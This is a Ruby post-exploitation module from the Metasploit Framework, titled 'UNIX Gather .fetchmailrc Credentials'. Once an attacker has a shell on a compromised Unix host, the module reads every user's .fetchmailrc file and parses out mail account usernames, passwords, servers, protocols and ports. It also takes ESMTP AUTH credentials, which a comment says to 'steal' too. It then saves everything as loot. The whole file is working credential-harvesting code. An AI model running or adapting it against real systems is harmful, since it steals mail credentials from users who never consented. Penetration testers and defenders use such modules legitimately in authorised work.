##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/unix'

class Metasploit3 < Msf::Post

	include Msf::Post::File
	include Msf::Post::Unix

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'UNIX Gather .fetchmailrc Credentials',
			'Description'   => %q{
				Post Module to obtain credentials saved for IMAP, POP and other mail
				retrieval protocols in fetchmail's .fetchmailrc
			},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'Jon Hart <jhart[at]spoofed.org>' ],
			'Platform'      => [ 'bsd', 'linux', 'osx', 'unix' ],
			'SessionTypes'  => [ 'shell' ]
		))
	end

	def run
		# A table to store the found credentials.
		cred_table = Rex::Ui::Text::Table.new(
		'Header'    => ".fetchmailrc credentials",
		'Indent'    => 1,
		'Columns'   =>
		[
			"Username",
			"Password",
			"Server",
			"Protocol",
			"Port"
		])

		# walk through each user directory
		enum_user_directories.each do |user_dir|
			fetchmailrc_file = ::File.join(user_dir, ".fetchmailrc")
			begin
				# read their .fetchmailrc if it exists
				lines = cmd_exec("test -r #{fetchmailrc_file} && cat #{fetchmailrc_file}").lines.to_a
				next if (lines.size <= 0)
				print_status("Parsing #{fetchmailrc_file}")

				# delete any comments
				lines.delete_if { |l| l =~ /^#/ }
				# trim any leading/trailing whitespace
				lines.map { |l| l.strip! }
				# turn any multi-line config options into a single line to ease parsing
				(lines.size - 1).downto(0) do |i|
					# if the line we are reading doesn't signify a new configuration section...
					if ((not lines[i] =~ /^(?:defaults|poll|skip)\s+/))
						# append the current line to the previous
						lines[i-1] << " "
						lines[i-1] << lines[i]
						# and axe the current line
						lines.delete_at(i)
					end
				end

				# any default options found, used as defaults for poll or skip lines
				# that are missing options and want to use defaults
				defaults = {}

				# now parse each line found
				lines.each do |line|
					# if there is a 'default' line, save any of these options as
					# they should be used when subsequent poll/skip lines are missing them.
					if (line =~ /^defaults/)
						defaults = parse_fetchmailrc_line(line).first
						next
					end

					# now merge the currently parsed line with whatever defaults may have
					# been found, then save if there is enough to save
					parse_fetchmailrc_line(line).each do |cred|
						cred = defaults.merge(cred)
						if (cred[:host] and cred[:protocol])
							if (cred[:users].size == cred[:passwords].size)
								cred[:users].each_index do |i|
									cred_table << [ cred[:users][i], cred[:passwords][i], cred[:host], cred[:protocol], cred[:port] ]
								end
							else
								print_error("Skipping '#{line}' -- number of users and passwords not equal")
							end
						end
					end
				end
			rescue ::Exception => e
				print_error("Couldn't read #{fetchmailrc_file}: #{e.to_s}")
			end
		end


		if cred_table.rows.empty?
			print_status("No creds collected")
		else
			print_line("\n" + cred_table.to_s)

			# store all found credentials
			p = store_loot(
				"fetchmailrc.creds",
				"text/csv",
				session,
				cred_table.to_csv,
				"fetchmailrc_credentials.txt",
				".fetchmailrc credentials")

			print_status("Credentials stored in: #{p.to_s}")
		end
	end

	# Parse a line +line+, assumed to be from a fetchmail configuration file,
	# returning an array of all credentials found on that line
	def parse_fetchmailrc_line(line)
		creds = []
		cred = {}
		# parse and clean any users
		users = line.scan(/\s+user(?:name)?\s+(\S+)/).flatten
		unless (users.empty?)
			cred[:users] = []
			users.each do |user|
				cred[:users] << user.gsub(/^"/, '').gsub(/"$/, '')
			end
		end
		# parse and clean any passwords
		passwords = line.scan(/\s+pass(?:word)?\s+(\S+)/).flatten
		unless (passwords.empty?)
			cred[:passwords] = []
			passwords.each do |password|
				cred[:passwords] << password.gsub(/^"/, '').gsub(/"$/, '')
			end
		end
		# parse any hosts, ports and protocols
		cred[:protocol] = $1 if (line =~ /\s+proto(?:col)?\s+(\S+)/)
		cred[:port] = $1 if (line =~ /\s+(?:port|service)\s+(\S+)/)
		cred[:host] = $1 if (line =~ /^(?:poll|skip)\s+(\S+)/)
		# a 'via' option overrides poll/skip
		cred[:host] = $1 if (line =~ /\s+via\s+(\S+)/)
		# save this credential
		creds << cred
		# fetchmail can also "forward" mail by pulling it down with POP/IMAP and then
		# connecting to some SMTP server and sending it.  If ESMTP AUTH (RFC 2554) credentials
		# are specified, steal those too.
		cred = {}
		cred[:users] = [ $1 ] if (line =~ /\s+esmtpname\s+(\S+)/)
		cred[:passwords] = [ $1 ] if (line =~ /\s+esmtppassword\s+(\S+)/)
		# XXX: what is the best way to get the host we are currently looting?  localhost is lame.
		cred[:host] = (line =~ /\s+smtphost\s+(\S+)/ ? $1 : 'localhost')
		cred[:protocol] = 'esmtp'
		# save the ESMTP credentials if we've found enough
		creds << cred if (cred[:users] and cred[:passwords] and cred[:host])
		# return all found credentials
		creds
	end

end
